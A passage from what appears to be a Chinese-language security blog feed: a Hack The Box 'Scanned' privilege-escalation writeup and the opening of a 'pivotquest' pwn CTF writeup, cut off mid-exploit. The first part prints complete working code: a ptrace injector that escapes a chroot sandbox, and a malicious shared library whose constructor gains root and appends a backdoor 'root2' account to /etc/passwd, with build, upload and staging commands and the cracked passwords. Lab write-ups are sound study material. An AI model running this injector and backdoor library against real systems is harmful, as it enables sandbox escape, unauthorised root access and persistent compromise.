class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌─[sg-dedivip-1]─[10.10.14.22]─[kazma@htb-5fjpirbhiq]─[~/Downloads/sandbox]</span><br><span class="line">└──╼ [★]$ python3 help.py http://10.129.237.62/viewer/012404b2081624a252957a599dd1a10c/; <span class="built_in">cat</span> out </span><br></pre></td></tr></table></figure></div>接著拿到 hash 之後換成正確的格式用 hashcat 爆破，拿到密碼 <code>onedayyoufeellikecrying</code>，有了可能得 ssh 密碼後我們可以重複剛剛的操作去撈 <code>/etc/passwd</code> 來找尋可能對應的 username，我們可以發現有個 user clarence，ssh 上去之後就可以在家目錄拿到 user flag 了！</li></ul><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>接下來我們要講一下 chroot，他的作用是將系統對絕對路徑以 &#x2F; 開頭的路徑的解析限制到指令的根目錄下，通常是用在沙盒化，讓程式只能訪問被隔離的檔案。而只有 root 可以執行 chroot，因為它會改變應用程式對檔案系統的看法，如果非 root 使用者能夠使用可能會有題權危險。<br>那我們的攻擊思路如下：</p><ul><li>首先我們先創建一個惡意的 library 命名成 <code>/lib/libc.so.6</code> 包含帶有 constructor 的程式碼，利用腳本把必要的檔案包含這個惡意的 library 複製到 &#x2F;lib 中的目錄。</li><li>程式在執行後會注入到 killer 中</li><li>使用 fchdir 進行 sandbox escape </li><li>就能夠到外面執行 &#x2F;bin&#x2F;su，如此 su 就會加載到剛剛的惡意 library 讓我們拿到 root 權限</li></ul><p>那在開始前，我們可以先看 <code>/bin/su</code> 正常在執行時會 load 的 libraries：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">clarence@scanned:~$ ldd /bin/su</span><br><span class="line">linux-vdso.so.1 (0x00007ffed15f3000)</span><br><span class="line">libpam.so.0 =&gt; /lib/x86_64-linux-gnu/libpam.so.0 (0x00007f9bdc63a000)</span><br><span class="line">libpam_misc.so.0 =&gt; /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007f9bdc635000)</span><br><span class="line">libutil.so.1 =&gt; /lib/x86_64-linux-gnu/libutil.so.1 (0x00007f9bdc630000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9bdc46b000)</span><br><span class="line">libaudit.so.1 =&gt; /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007f9bdc43a000)</span><br><span class="line">libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f9bdc434000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f9bdc666000)</span><br><span class="line">libcap-ng.so.0 =&gt; /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007f9bdc42a000)</span><br><span class="line">libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f9bdc408000)</span><br></pre></td></tr></table></figure></div><p>其中可以看到 <code>libpam_misc.so.0</code> 是一個和 PAM（Pluggable Authentication Module）相關的共享庫，通常被身份驗證相關的應用程序加載，在這邊就很適合作為我們覆蓋的目標。<br>我們的目標是在系統中創建一個新用戶 root2，並賦予其 root 權限，做法是通過在 <code>/etc/passwd</code> 下面的內容：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root2:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure></div><p>接著我們把新的 exploit：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stage_1</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stage_2</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">log_data</span><span class="params">(<span class="type">char</span>* data, <span class="type">unsigned</span> <span class="type">long</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">inject</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">guard</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">putdata</span><span class="params">(<span class="type">pid_t</span> child, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr, <span class="type">char</span>* str, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">char</span>* laddr;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">u</span> &#123;</span></span><br><span class="line">        <span class="type">long</span> val;</span><br><span class="line">        <span class="type">char</span> chars[<span class="keyword">sizeof</span>(<span class="type">int</span>)];</span><br><span class="line">    &#125; data;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / <span class="keyword">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        <span class="keyword">if</span> (ptrace(PTRACE_POKEDATA, child, (<span class="type">void</span>*)addr + i * <span class="keyword">sizeof</span>(<span class="type">int</span>), data.val) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error poking - %d\n&quot;</span>, errno);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++i;</span><br><span class="line">        laddr += <span class="keyword">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    j = len % <span class="keyword">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">    <span class="keyword">if</span> (j != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, (<span class="type">void</span>*)addr + i * <span class="keyword">sizeof</span>(<span class="type">int</span>), data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stage_1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> pid = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Child is %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_ATTACH, pid, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Attaching&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Attached\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Get regs&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Got regs\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    putdata(pid, regs.rip, (<span class="type">char</span>*)inject, (<span class="type">int</span>)(&amp;guard - &amp;inject));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Wrote data\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_DETACH, pid, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Detach&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Detached!&quot;</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stage_2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Stage 2 - currently running in killer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> fd = <span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> cwd = open(<span class="string">&quot;.&quot;</span>, O_RDONLY | O_DIRECTORY);</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">    status = fchdir(fd);</span><br><span class="line">    <span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fchdir() = %d\n&quot;</span>, errno);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    status = chdir(<span class="string">&quot;../../../../../../../../../../&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;chdir() = %d\n&quot;</span>, errno);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* args[] = &#123;<span class="string">&quot;bin/su&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(<span class="string">&quot;bin/su&quot;</span>, args, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to su&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inject</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> program[] = <span class="string">&quot;/userprog&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* arg[<span class="number">3</span>] = &#123;program, <span class="string">&quot;2&quot;</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movq $59, %%rax; movq %0, %%rdi; movq %1, %%rsi; xor %%rdx, %%rdx; syscall;&quot;</span></span><br><span class="line">        :</span><br><span class="line">        : <span class="string">&quot;r&quot;</span>(program), <span class="string">&quot;r&quot;</span>(arg)</span><br><span class="line">        : <span class="string">&quot;rax&quot;</span>, <span class="string">&quot;rdi&quot;</span>, <span class="string">&quot;rsi&quot;</span>, <span class="string">&quot;rdx&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">guard</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        do_stage_1();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        do_stage_2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>以及新的惡意 library：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// `libpam_misc.so.0` is expected to define this symbol</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">misc_conv</span><span class="params">()</span> &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __attribute__((constructor)) <span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello from constructor, I am %d:%d (%d:%d)\n&quot;</span>, getuid(), geteuid(), getgid(), getegid());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Make ourselves root proper</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SEUID %d %d\n&quot;</span>, seteuid(<span class="number">0</span>), errno);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SUID %d %d\n&quot;</span>, setuid(<span class="number">0</span>), errno);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Restore the true system root</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Chroot %d %d\n&quot;</span>, chroot(<span class="string">&quot;../../../../../../&quot;</span>), errno);</span><br><span class="line">    chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add a new record to /etc/passwd (password: suidroot)</span></span><br><span class="line">    <span class="type">char</span> *args[] = &#123;</span><br><span class="line">        <span class="string">&quot;/bin/sh&quot;</span>, </span><br><span class="line">        <span class="string">&quot;-p&quot;</span>, </span><br><span class="line">        <span class="string">&quot;-c&quot;</span>, </span><br><span class="line">        <span class="string">&quot;echo &#x27;root2:YiY4/N2td230w:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd&quot;</span>, </span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, args, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Execve failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>編譯完透過 scp 丟到 remote server。</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">musl-gcc main.c -fPIC -static -fno-stack-protector -o exploit</span><br><span class="line">gcc -shared -fPIC -o evil.so mal_lib.c</span><br><span class="line">scp exploit evil.so clarence@10.129.237.62:/tmp</span><br></pre></td></tr></table></figure></div><p>接著我們在 &#x2F;tmp 下面寫一個腳本把這兩個 processess 綁在一起：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">FOLDER=$(pwgen 10 1)</span><br><span class="line"><span class="built_in">mkdir</span> <span class="string">&quot;<span class="variable">$FOLDER</span>&quot;</span></span><br><span class="line"><span class="built_in">cp</span> exploit evil.so <span class="string">&quot;<span class="variable">$FOLDER</span>&quot;</span></span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$FOLDER</span>&quot;</span> || <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">mkdir</span> -p jails/a/usr/lib/x86_64-linux-gnu/</span><br><span class="line">/var/www/malscanner/sandbox/sandbox <span class="string">&quot;<span class="subst">$(pwd)</span>/exploit&quot;</span> a &amp;</span><br><span class="line"><span class="built_in">sleep</span> 0.1</span><br><span class="line"><span class="built_in">cp</span> /usr/lib/x86_64-linux-gnu/&#123;libutil.so.1,libpam.so.0,libaudit.so.1,libcap-ng.so.0,libdl.so.2,libpthread.so.0&#125; jails/a/usr/lib/x86_64-linux-gnu/</span><br><span class="line"><span class="built_in">cp</span> evil.so jails/a/usr/lib/x86_64-linux-gnu/libpam_misc.so.0</span><br><span class="line"><span class="built_in">chmod</span> +x jails/a/usr/lib/x86_64-linux-gnu/</span><br></pre></td></tr></table></figure></div><p>然後給他執行權限後跑起來就可以看到以下畫面：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">clarence@scanned:/tmp$ ./exploit.sh </span><br><span class="line">Child is 2</span><br><span class="line">[*] Attached</span><br><span class="line">[*] Got regs</span><br><span class="line">[*] Wrote data</span><br><span class="line">[*] Detached!</span><br><span class="line">clarence@scanned:/tmp$ Stage 2 - currently running <span class="keyword">in</span> killer</span><br><span class="line">Exited</span><br><span class="line">bin/su: /lib/x86_64-linux-gnu/libpam_misc.so.0: no version information available (required by bin/su)</span><br><span class="line">Hello from constructor, I am 1001:0 (1001:1001)</span><br><span class="line">SEUID 0 0</span><br><span class="line">SUID 0 0</span><br><span class="line">Chroot 0 0</span><br></pre></td></tr></table></figure></div><p>然後看 <code>/etc/passwd</code> 就可以看到 root2 被寫到裡面了，接著我們就可以用密碼 <code>suidroot</code> 來執行 su root2。</p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned!!!"></a>Pwned!!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/scanned_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Scanned&quot;&gt;&lt;a href=&quot;#Scanned&quot; class=&quot;headerlink&quot; title=&quot;Scanned&quot;&gt;&lt;/a&gt;Scanned&lt;/h2&gt;&lt;p&gt;今天在神盾決賽前練習一些滲透測試，打算跟著官方 writeup 刷一些 insane 高分的機器。&lt;</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
    
    <category term="sandbox escape" scheme="https://kazma.tw/tags/sandbox-escape/"/>
    
  </entry>
  
  <entry>
    <title>Pwn CTF pivotquest Writeup</title>
    <link href="https://kazma.tw/2024/11/11/Pwn-CTF-pivotquest-Writeup/"/>
    <id>https://kazma.tw/2024/11/11/Pwn-CTF-pivotquest-Writeup/</id>
    <published>2024-11-11T11:44:15.676Z</published>
    <updated>2024-11-11T11:55:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>先看一下這題的主邏輯：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> edx; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> ecx; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> r8; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> r9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> edx2; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> ecx2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> r82; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> r92; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">4</span>]; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v13 = fork();</span><br><span class="line">  <span class="keyword">if</span> ( v13 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v13 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;unk_499018);</span><br><span class="line">    read(<span class="number">0LL</span>, buf, <span class="number">48LL</span>);</span><br><span class="line">    <span class="built_in">printf</span>((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_499037, (<span class="type">unsigned</span> <span class="type">int</span>)buf, edx, ecx, r8, r9);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  waitpid(v13, v12, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Kid&#x27;s missing... Again?&quot;</span>);</span><br><span class="line">  read(<span class="number">0LL</span>, buf, <span class="number">96LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_499037, (<span class="type">unsigned</span> <span class="type">int</span>)buf, edx2, ecx2, r82, r92);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>有 canary 沒有 PIE，然後有兩個輸入點都可以 overflow，而且是 statically linked。<br>首先第一步是我們可以透過填滿 canary 前的空間讓他 printf 的時候一直印到 canary 的 null byte 為止，這樣我們就可以先取得 canary，然後再透過 migration 把 stack 搬到 bss 段，接著第二次輸入時就可以正常 rop 而且 &#x2F;bin&#x2F;sh 是在 bss 段了。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pivotquest&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pivotquest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = elf.bss() + <span class="number">0x500</span></span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x451037</span></span><br><span class="line">pop_rdi_ret = <span 